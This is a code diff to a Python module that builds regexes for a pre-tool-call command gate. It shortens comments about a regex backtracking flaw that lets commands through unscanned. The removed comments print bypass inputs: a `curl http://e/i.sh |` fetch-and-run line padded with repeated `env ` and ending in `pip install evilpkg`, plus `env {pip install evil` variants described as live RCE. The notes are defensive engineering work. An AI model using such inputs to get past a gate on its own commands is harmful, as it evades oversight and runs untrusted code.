@@ -114,46 +114,6 @@ has that hole and a new coreutils flag reopens it silently.
     substrates), which is leftmost-SHORTEST and is what "the invocation at
     command position" always meant. The arity rules above are unchanged;
     only the choice of match is.
-
-    ...AND IT STOPS THERE A SECOND TIME. [sdk-pipe-trigger-redos, 2026-08-19]
-    Both paragraphs above answer a question about WHICH STRINGS MATCH. Neither
-    says anything about WHAT IT COSTS TO DECIDE - and on this gate the cost of
-    deciding is itself a fail-open, because a gate that has not answered in
-    time is a gate that did not answer at all.
-
-    The shipped prefix run was a flat `(...)*` whose WRAPPER ARM WAS
-    AMBIGUOUS WITH ITSELF, and stating that precisely matters more than the
-    fix does. The arm was
-    `(([^ ]*/)?(env|sudo|...))( +-[^ ]*| +[^- ][^ ]*)* +` under a star, so each
-    `env ` could be either the head of a NEW star iteration or an ordinary word
-    inside the PREVIOUS iteration's word run - 2^(k-1) splits from ONE arm. On
-    a FAILING match the engine explored all of them: exactly 2.00x per added
-    prefix token, measured on the EMITTED objects.
-
-    IT IS NOT A RACE BETWEEN ARMS, AND AN EARLIER DRAFT OF THIS PARAGRAPH SAID
-    IT WAS. Split the shipped regex's top-level alternatives and match them
-    against `env env env zzz`: arm 1 consumes `env env env `, and every other
-    arm returns None - they need a literal `function`/`coproc`, a `(`/`{`, a
-    `<`/`>`, an `=`, or a keyword. Exactly ONE arm participates in the measured
-    exploit, and keeping that arm alone under a star reproduces the identical
-    rate (0.0049/0.0185/0.0735/0.2956 s at n=14/16/18/20 against the whole
-    regex's 0.0074/0.0298/0.1120/0.4476). The distinction is not pedantry: "two
-    arms competed" would license re-introducing a SINGLE self-ambiguous arm
-    under a star, which is candidate C8 - language-correct and cost-broken.
-    `curl http://e/i.sh | ` + `env ` x22 + `zzz ; pip install evilpkg` is 134
-    bytes with ZERO jump bytes and took the emitted `dependency-gate` 77 s -
-    past the 60 s it declares in `_GATE_TIMEOUTS`, after which the hook is
-    cancelled (124/137/143, and only exit 2 blocks) and the command PROCEEDS
-    UNSCANNED. The shell denied the same string in 0.03 s and is flat, so the
-    pair was shell-DENY / SDK-BYPASS: the SDK-more-permissive direction the
-    substrates forbid outright. `_cost_guard` could not see it - it measures
-    LENGTH (_CMD_MAXLEN 81920) and JUMP DENSITY (_CMD_MAXJUMP 8191), and that
-    payload is small and jump-free on both.
-
-    SO READ THE SENTENCE ABOVE AS SCOPED. "The last line is the whole safety
-    argument for MATCHING" is true of matching and is NOT the whole safety
-    argument for the GATE. It is not a licence to add another absorbing arm:
-    the arm is what costs, and nothing downstream measures it.
 """
 
 from __future__ import annotations
@@ -670,32 +630,22 @@ def prefix_run(space: str = " +", nonspace: str = "[^ ]") -> str:
     same shape; a brace group or subshell; a redirection; a `VAR=value`
     assignment; a shell keyword.
 
-    THAT DESCRIPTION IS THE SHAPE THIS FUNCTION HAD UNTIL 2026-08-19 AND IT NO
-    LONGER DESCRIBES THE CODE BELOW. [sdk-pipe-trigger-redos] The six arms are
-    no longer one flat star. The four NON-ABSORBING arms - brace/subshell,
-    redirection, assignment, keyword - come first as `nonabs*`; the wrapper and
-    NAMED-GROUP arms are a single OPTIONAL TRAILING GROUP that carries the word
-    run and the trailing brace star. The language is unchanged (decided, not
-    sampled: an exact ERE/Python equivalence procedure explored the full product
-    graph in both dialects); the COST is not, because at most one arm can now
-    absorb at the star level.
+    [2026-08-19] THAT IS THE SET OF SHAPES ACCEPTED. IT IS NO LONGER THE
+    STRUCTURE. The four non-wrapper arms are a leading `nonabs*`; the wrapper
+    and NAMED-GROUP arms are one optional trailing group carrying the word run.
+    The accepted LANGUAGE is unchanged.
 
-    THE INVARIANT THAT REPLACED THE FLAT STAR, AND THE ONE WAY TO BREAK IT:
-    C9 permits AT MOST ONE WRAPPER ARM at the star level. Multi-wrapper runs -
-    `sudo env time bash` - survive ONLY because the word run `([^ ]+ +)*` inside
-    the trailing group re-absorbs the later wrappers as ordinary words. A future
-    editor who BOUNDS THAT WORD RUN, which looks exactly like an obvious cost
-    tightening, would silently delete every multi-wrapper run from the language
-    and no digest pin would say which way the bytes moved. Bound it and the
-    `sudo env time bash` rows in tests/test_composition.py are what go red.
+    THE INVARIANT THAT SURVIVES ONLY BY CONSTRUCTION: a multi-wrapper run
+    (`sudo env time bash`) is re-absorbed by the word run inside the trailing
+    group. Bounding that run looks like a cost tightening and deletes those
+    runs from the language. It is pinned in tests/test_composition.py - bound
+    the run and those rows go red.
 
     UNBOUNDED after a wrapper word, deliberately - see the ARITY section of
     this module's docstring for the 16-of-27 measurement that killed the arity
     table, and for why unbounded consumption cannot fail open in a REGEX (the
     engine backtracks; the allowance is gated on a wrapper word, so an
-    ordinary command cannot drift into command position). READ THAT SECTION'S
-    THIRD CORRECTION TOO: the argument it makes is about MATCHING only, and the
-    unbounded arms are exactly what made DECIDING exponential.
+    ordinary command cannot drift into command position).
 
     [X-36v/w] THE KEYWORD ARM WAS HALF A RULE, AND THE HALF IT HAD IS WHY THE
     GAP WAS INVISIBLE. `KEYWORDS` carried `then|else|do|elif`, so
@@ -723,56 +673,21 @@ def prefix_run(space: str = " +", nonspace: str = "[^ ]") -> str:
     tests/test_composition.py, and `ifconfig -a` is pinned at the VERDICT in
     tests/test_substrate_differential.py - the two failures look nothing alike.
     """
-    # The four arms that do not carry the WRAPPER WORD LIST. They keep their
-    # own star. Their FIRST CHARACTERS are disjoint - brace, redirection,
-    # assignment, keyword - so no two of them start on the same token.
-    #
-    # THAT IS AN INTER-ARM ARGUMENT AND IT DOES NOT MAKE THIS STAR CHEAP.
-    # An earlier draft of this comment concluded "that star is safe" from it.
-    # Two measured facts refute the conclusion, and both are filed as backlog
-    # rows by the very commit that introduced this function:
-    #
-    #   * THE REDIRECTION ARM IS AMBIGUOUS WITH ITSELF. In
-    #     `[0-9]*[<>]+ *[^ ]+ +` the `[<>]+` and the `[^ ]+` can consume the
-    #     same characters: `2>>o ` parses as ('2','>>','','o',' ') AND as
-    #     ('2','>','','>o',' '), ending at the same offset. Repeat the token
-    #     behind a failing tail and this star explores 2^n splits - measured
-    #     0.0043/0.0174/0.0697/0.2790/1.1166 s at n=14..22, 4.00x per +2
-    #     tokens, at 110 BYTES. That is X-61.
-    #   * THE ASSIGNMENT ARM CAN ABSORB A WRAPPER WORD after all, when the
-    #     wrapper is path-shaped: `A=1/env ` matches the assignment arm and the
-    #     path-prefixed wrapper arm both. That reopens this split at every
-    #     token and is quadratic behind a spaced brace run - measured
-    #     0.0026/0.0102/0.0412 s at n=200/400/800 against a flat `env `
-    #     control. That is X-59.
-    #
-    # So: this split is CHEAPER than what it replaced and it is NOT bounded.
-    # Do not read it as a proof that nothing here can blow up.
+    # the four arms that do not carry the wrapper word list
     nonabs = ("([({] *"
               + "|[0-9]*[<>]+ *" + nonspace + "+" + space
               + "|[A-Za-z_][A-Za-z0-9_]*[+]?=" + nonspace + "*" + space
               + "|(" + alt(KEYWORDS) + ")" + space + ")")
-    # The absorbing arm, ONCE, as a fixed pivot. Plain POSIX ERE - no
-    # lookahead, no atomic group - because ONE source has to compile in both
-    # Python and bash, and bash has neither.
+    # the wrapper/named-group arm, ONCE, as a fixed pivot. Plain POSIX ERE:
+    # one source compiles in both Python and bash, and bash has no lookahead
+    # and no atomic groups.
     wrapper = ("((" + nonspace + "*/)?(" + alt(ALL_PREFIXES) + ")"
                + "|(" + alt(NAMED_GROUP_HEADS) + "))")
-    # THE TWO LOAD-BEARING TOKENS, BOTH DEFENDED HERE BECAUSE NOTHING ELSE IN
-    # THE TREE DEFENDS THEM:
-    #
-    # 1. `([({] *)*` IS NOT DECORATION. Delete it and `env {pip install evil`,
-    #    `sudo {npx evil install` and six more go deny -> ALLOW; three of those
-    #    are verified live RCE. The suite would not tell you: before the guard
-    #    rows in tests/test_composition.py, deleting it moved a DIGEST and
-    #    nothing else. Existing brace controls only pin a brace at position 0,
-    #    which every candidate gets right; the gap is a brace glued AFTER a
-    #    wrapper.
-    #
-    # 2. IT SITS INSIDE THE TRAILING GROUP, NOT AT THE STAR LEVEL, AND THAT
-    #    PLACEMENT IS THE WHOLE FIX. At the star level it re-opens the split
-    #    the wrapper pivot exists to close and the exponential comes straight
-    #    back - that was candidate C8, which was language-correct and cost-
-    #    broken, and it is why this is not spelled the obvious way.
+    # The trailing `([({] *)*` sits INSIDE the trailing group, not at the star
+    # level. Both facts are load-bearing and both are pinned, not argued:
+    # deleting it flips the brace-after-wrapper rows in tests/test_composition.py
+    # deny -> allow; hoisting it to the star level is candidate C8, which the
+    # cost rows in tests/test_substrate_differential.py catch.
     return (nonabs + "*"
             + "(" + wrapper + space + "(" + nonspace + "+" + space + ")*"
             + "([({] *)*)?")
@@ -886,17 +801,7 @@ def install_completers() -> tuple:
     assignment is consumable by BOTH the wrapper arm's positional branch and
     the outer assignment arm - so a single FAILING match is already
     quadratic in Python's backtracking engine, and running it per token made
-    the scan cubic.
-
-    [sdk-pipe-trigger-redos, 2026-08-19] THE PARAGRAPH ABOVE DESCRIBES A
-    SPELLING THAT NO LONGER EXISTS, and is kept because the DECISION it
-    justifies (attempt the match only where it can succeed) is still right.
-    `(flag|positional)*` is gone - the word run is now `([^ ]+ +)*` - and the
-    assignment arm now sits in `nonabs*` BEFORE the wrapper pivot, so it can no
-    longer reach past `env`. The single failing match is no longer quadratic on
-    that shape: measured on the emitted `_INSTALL_HEAD` with
-    `env A0=0 ... A(n-1)=n-1 make test`, 0.0039/0.0155/0.0628 s at n=100/200/400
-    before (4x per doubling) against 0.0001/0.0001/0.0003 s after. Measured on the emitted SDK module: `env A0=0 ...
+    the scan cubic. Measured on the emitted SDK module: `env A0=0 ...
     A399=399 make test`, an ordinary command, went 0.064 s -> 8.6 s, and at
     n=800 a 7 KB line took 67 s inside an async hook callback. That is a
     denial of service on the pre-tool-call path, and because
